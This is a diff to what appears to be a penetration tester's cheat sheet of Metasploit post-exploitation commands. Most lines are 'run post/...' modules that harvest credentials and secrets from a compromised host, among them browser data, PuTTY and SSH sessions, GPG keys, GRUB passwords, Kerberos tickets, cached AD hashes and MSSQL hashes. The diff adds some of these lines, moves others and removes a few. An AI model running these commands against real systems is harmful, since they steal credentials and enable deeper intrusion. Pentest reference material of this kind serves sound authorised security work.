@@ -25,6 +25,14 @@ run post/windows/gather/enum_chrome (dump chrome browser cache data)
 
 run post/windows/gather/enum_putty_saved_sessions (discover putty SSH sessions)
 
+run post/multi/gather/gpg_creds
+
+run post/multi/gather/grub_creds
+
+run post/multi/gather/unix_kerberos_tickets
+
+run post/multi/gather/unix_cached_ad_hashes
+
 =========
 
 run dumplinks (dump shortcut lnk files)
@@ -158,7 +166,7 @@ run post/windows/gather/credentials/mremote
 
 run post/windows/gather/credentials/mssql_local_hashdump
 
-run post/windows/gather/enum_tomcat
+
 
 run post/windows/gather/credentials/nimbuzz
 
@@ -393,8 +401,6 @@ run post/multi/manage/sudo
 
 run post/multi/gather/fetchmailrc_creds
 
-run post/multi/gather/ssh_creds
-
 run post/multi/manage/system_session
 
 run post/multi/gather/filezilla_client_cred
@@ -413,21 +419,10 @@ run post/multi/gather/firefox_creds
 
 run post/multi/gather/ubiquiti_unifi_backup
 
-run post/multi/recon/local_exploit_suggester
-
-run post/multi/gather/gpg_creds
-
-run post/multi/gather/unix_cached_ad_hashes
 
 run post/multi/recon/multiport_egress_traffic
 
-run post/multi/gather/grub_creds
 
-run post/multi/gather/unix_kerberos_tickets
-
-run post/multi/recon/sudo_commands
-
-run post/multi/gather/irssi_creds
 
 run post/multi/gather/wlan_geolocate
 
